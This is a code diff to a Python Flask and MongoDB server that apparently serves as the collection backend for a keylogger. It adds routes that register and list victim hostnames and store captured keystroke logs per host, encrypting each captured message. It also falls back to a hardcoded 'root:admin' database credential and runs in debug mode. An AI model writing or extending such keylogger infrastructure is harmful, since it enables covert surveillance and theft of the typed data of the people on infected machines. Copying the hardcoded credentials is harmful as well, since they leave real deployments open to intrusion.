@@ -3,17 +3,19 @@ from flask_pymongo import PyMongo
 from cryptography.fernet import Fernet
 from logging import exception
 from os import environ
+
 #CONSTANTS
 TABLE = 'keylogger'
 PARAMS = '?authSource=admin'
-URL = environ.get('MONGODB_URL') + TABLE + PARAMS
-MSG_SUCESS = "Insert successfully"
+URL = environ.get('MONGODB_URL') or "mongodb://root:admin@localhost/"
+MSG_SUCESS = "Insert sucessfully"
 MSG_EXIST = "Insert already exist"
 MSG_NULL = "Error null values"
+MSG_INT_ERROR = "Internal Error"
 
 app = Flask(__name__)
-app.config['MONGO_URI'] = URL
-#app.config['MONGO_URI']='mongodb://root:admin@localhost/keylogger?authSource=admin'
+app.config['MONGO_URI'] = f'{URL}{TABLE}{PARAMS}'
+#app.config['MONGO_URI']='mongodb://root:admin@localhost/keylogger?authSource=admina'
 mongo = PyMongo(app)
 
 # KEY
@@ -39,18 +41,43 @@ def ping():
 @app.route('/host', methods=['POST'])
 def insertHost():
     try:
-        data = request.json['hostname']
-        if data:
-            #if mongo.db.hosts.
-            # if mongo.db.hosts.find_one(filter={ "hostname": data['hostname'] }):
-            #     return jsonify({"message": MSG_EXIST})
+        data = request.json
+        hn = data['hostname']
+        if hn:
+            if mongo.db.hosts.find_one(data): # CHECK IF EXIST
+                return jsonify({"message": MSG_EXIST})
             mongo.db.hosts.insert_one(data)
             data.update({'_id': str(data['_id'])})
             return jsonify({"message": MSG_SUCESS, "result": data})
         else:
             return jsonify({"message": MSG_NULL})
     except:
-        print("[SERVER]: Error at insertHost()")
+        print("[SERVER]: Error in route /host [POST] ->")
+        return jsonify({"message": MSG_INT_ERROR}), 500
+
+@app.route('/host', methods=['GET'])
+def viewHosts():
+    try:
+        data = mongo.db.hosts.find()
+        toReturn = []
+        for doc in data:
+            del doc['_id']
+            toReturn.append(doc)
+        if toReturn:
+            return jsonify({
+                "count": len(toReturn),
+                "message":"Host's list",
+                "results": toReturn
+            }), 200
+        else:
+            return jsonify({
+                "count": 0,
+                "message":"Host's list",
+                "results": {}
+            }), 200
+    except Exception:
+        exception("[SERVER]: Error in route /host [GET] ->")
+        return jsonify({"message": MSG_INT_ERROR}), 500
 
 @app.route('/log', methods=['GET'])
 def viewLogs():
@@ -75,7 +102,7 @@ def viewLogs():
             }), 200
     except Exception:
         exception("[SERVER]: Error in route /log [GET] ->")
-        return jsonify({"message": "Internal Error"}), 500
+        return jsonify({"message": MSG_INT_ERROR}), 500
 
 @app.route('/log', methods=['POST'])
 def insertLog():
@@ -83,21 +110,19 @@ def insertLog():
         msg = request.json['message']
         title = request.json['title']
         dt = request.json['datetime']
-        if msg and title and dt: 
+        hn = request.json['hostname']
+        if msg and title and dt and hn: 
+            data = request.json
             message = cifrar(msg)
-            data = {
-                'message': message,
-                'title': title,
-                'datetime': dt
-            }
-            res = mongo.db.logs.insert_one(data)
+            data.update({'message': message})
+            mongo.db.logs.insert_one(data)
             data.update({'message': str(message),'_id': str(data['_id'])})
             return jsonify({"message": data})
         else:
-            return jsonify({"message": "Nulls values!"})
+            return jsonify({"message": MSG_NULL})
     except Exception:
         exception("[SERVER]: Error in route /log [POST] ->")
-        return jsonify({"message": "Internal Erro r"}), 500
+        return jsonify({"message": MSG_INT_ERROR}), 500
 
 if __name__ == "__main__":
     app.run(debug=True)
